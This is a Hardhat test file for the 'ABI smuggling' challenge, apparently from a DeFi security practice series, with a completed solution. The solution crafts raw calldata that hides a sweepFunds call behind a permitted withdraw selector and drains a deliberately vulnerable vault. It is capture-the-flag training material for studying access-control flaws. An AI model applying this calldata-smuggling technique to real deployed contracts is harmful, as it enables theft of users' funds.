const { ethers } = require('hardhat');
const { expect } = require('chai');

describe('[Challenge] ABI smuggling', function () {
    let deployer, player, recovery;
    let token, vault;
    
    const VAULT_TOKEN_BALANCE = 1000000n * 10n ** 18n;

    before(async function () {
        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
        [ deployer, player, recovery ] = await ethers.getSigners();

        // Deploy Damn Valuable Token contract
        token = await (await ethers.getContractFactory('DamnValuableToken', deployer)).deploy();

        // Deploy Vault
        vault = await (await ethers.getContractFactory('SelfAuthorizedVault', deployer)).deploy();
        expect(await vault.getLastWithdrawalTimestamp()).to.not.eq(0);

        // Set permissions
        const deployerPermission = await vault.getActionId('0x85fb709d', deployer.address, vault.address); // ethers.utils.id("sweepFunds(address,address)").substring(0, 10)
        const playerPermission = await vault.getActionId('0xd9caed12', player.address, vault.address);     // ethers.utils.id("withdraw(address,address,uint256)").substring(0, 10)
        await vault.setPermissions([deployerPermission, playerPermission]);
        expect(await vault.permissions(deployerPermission)).to.be.true;
        expect(await vault.permissions(playerPermission)).to.be.true;

        // Make sure Vault is initialized
        expect(await vault.initialized()).to.be.true;

        // Deposit tokens into the vault
        await token.transfer(vault.address, VAULT_TOKEN_BALANCE);

        expect(await token.balanceOf(vault.address)).to.eq(VAULT_TOKEN_BALANCE);
        expect(await token.balanceOf(player.address)).to.eq(0);

        // Cannot call Vault directly
        await expect(
            vault.sweepFunds(deployer.address, token.address)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
        await expect(
            vault.connect(player).withdraw(token.address, player.address, 10n ** 18n)
        ).to.be.revertedWithCustomError(vault, 'CallerNotAllowed');
    });

    it('Execution', async function () {
        /** CODE YOUR SOLUTION HERE */
        /** Step1: recreate and verify key function selector */
        const sigExecute = ethers.utils.id("execute(address,bytes)").substring(0, 10);
        const sigWithdraw = ethers.utils.id("withdraw(address,address,uint256)").substring(0, 10);
        const sigSweepFunds = await vault.interface.encodeFunctionData(
            "sweepFunds",
            [ recovery.address, token.address ]
        )
        /** Step2: prepare concatenated calldata for vault.execute */
        const calldataExecute = ethers.utils.hexConcat([
            sigExecute,
            ethers.utils.hexZeroPad(vault.address, 32),
            ethers.utils.hexZeroPad(0x64, 32),
            ethers.utils.hexZeroPad(0, 32),
            sigWithdraw,
            ethers.utils.hexZeroPad(
                ethers.utils.hexlify((sigSweepFunds.length - 2) / 2), 32  // datasize = (hexString - 2) / 2
            ),
            sigSweepFunds,
        ]);
        // console.log(calldataExecute);
        // 0x
        // 1cff79cd                                                         -> sigExecute
        // 000000000000000000000000e7f1725e7734ce288f8367e1bb143e90bb3f0512 -> address target
        // 0000000000000000000000000000000000000000000000000000000000000064 -> bytes calldata actionData >> 64 bytes offset
        // 0000000000000000000000000000000000000000000000000000000000000000 -> zeros padding
        // d9caed12                                                         -> sigWithdraw
        // 0000000000000000000000000000000000000000000000000000000000000044 -> bytes calldata actionData >> 44 bytes size
        // 85fb709d                                                         -> sigSweepFunds
        // 0000000000000000000000003c44cdddb6a900fa2b585dd299e03d12fa4293bc -> address receiver
        // 0000000000000000000000005fbdb2315678afecb367f032d93f642f64180aa3 -> IERC20 token
        await player.sendTransaction({
            to: vault.address,
            data: calldataExecute,
        });
    });

    after(async function () {
        /** SUCCESS CONDITIONS - NO NEED TO CHANGE ANYTHING HERE */
        expect(await token.balanceOf(vault.address)).to.eq(0);
        expect(await token.balanceOf(player.address)).to.eq(0);
        expect(await token.balanceOf(recovery.address)).to.eq(VAULT_TOKEN_BALANCE);
    });
});
